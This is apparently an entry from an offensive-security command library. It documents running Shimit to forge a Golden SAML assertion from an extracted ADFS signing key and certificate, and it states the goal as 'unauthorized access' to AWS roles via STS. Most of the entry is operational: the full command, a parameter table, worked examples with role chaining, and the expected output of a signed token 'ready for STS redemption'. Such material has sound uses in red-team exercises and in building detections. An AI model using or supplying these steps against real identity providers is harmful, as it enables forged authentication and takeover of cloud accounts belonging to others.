---
id: 68c0abc2-deec-4de5-a6a7-51ce409c7550
name: run-shimit-for-golden-saml-forgery
type: command
executor: bash
data: >-
  python shimit.py -idp $_IDP_ENDPOINT -pk $_PRIVATE_KEY_FILE -c $_CERT_FILE -u
  $_USERNAME -n $_NAME_ID -r $_ROLE_ARN1 -r $_ROLE_ARN2 -id $_AWS_ACCOUNT_ID
output: null
created_at: '2023-04-06T03:56:09.723953+00:00'
updated_at: '2023-04-10T20:20:18.060634+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - saml
  - forgery
  - aws
verified: true
validated: true
---

# run-shimit-for-golden-saml-forgery

## Command

```bash
python shimit.py -idp $_IDP_ENDPOINT -pk $_PRIVATE_KEY_FILE -c $_CERT_FILE -u $_USERNAME -n $_NAME_ID -r $_ROLE_ARN1 -r $_ROLE_ARN2 -id $_AWS_ACCOUNT_ID
```

## Description

This command executes the Shimit script to generate a forged Golden SAML assertion using ADFS private key and certificate. It crafts a signed XML token with embedded AWS role assumptions for unauthorized access via STS. Multiple -r flags can be used for role chaining.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-idp` | ADFS Identity Provider endpoint URL | Yes |
| `$_IDP_ENDPOINT` | Full URL (e.g., https://adfs.example.com/adfs/services/trust) | Yes |
| `-pk` | Path to private key file (.pem) | Yes |
| `$_PRIVATE_KEY_FILE` | Extracted ADFS token-signing key | Yes |
| `-c` | Path to certificate file (.crt or .pem) | Yes |
| `$_CERT_FILE` | Matching ADFS signing certificate | Yes |
| `-u` | Username for the forged assertion | Yes |
| `$_USERNAME` | Domain\user format (e.g., domain\admin) | Yes |
| `-n` | NameID for SAML subject | Yes |
| `$_NAME_ID` | Email or UPN (e.g., admin@domain.com) | Yes |
| `-r` | AWS role ARN to assume (repeatable) | Yes |
| `$_ROLE_ARN1` | First role (e.g., arn:aws:iam::123:role/ADFS-admin) | Yes |
| `$_ROLE_ARN2` | Second role (e.g., arn:aws:iam::123:role/ADFS-monitor) | No |
| `-id` | Target AWS account ID | Yes |
| `$_AWS_ACCOUNT_ID` | 12-digit account number (e.g., 123456789012) | Yes |

## Examples

### Basic Usage

```bash
python shimit.py -idp https://adfs.lab.local/adfs/services/trust -pk key.pem -c cert.pem -u domain\admin -n admin@domain.com -r arn:aws:iam::123456789012:role/ADFS-admin -id 123456789012
```

### Advanced Usage with Multiple Roles

```bash
python shimit.py -idp https://adfs.example.com/adfs/ls/ -pk signing_key.pem -c signing_cert.pem -u domain\user -n user@domain.com -r arn:aws:iam::123:role/Admin -r arn:aws:iam::123:role/ReadOnly -id 123456789012
```

## Expected Output

Generating Golden SAML token...
SAML Assertion created successfully.
Token saved to: golden_saml.xml

(The XML file contains the signed <saml:Assertion> with embedded AWS roles, ready for STS redemption.)

## Related

- [[procedures/Golden-SAML-Attack-Using-Shimit]]
- [[commands/pip-install-shimit-dependencies]]
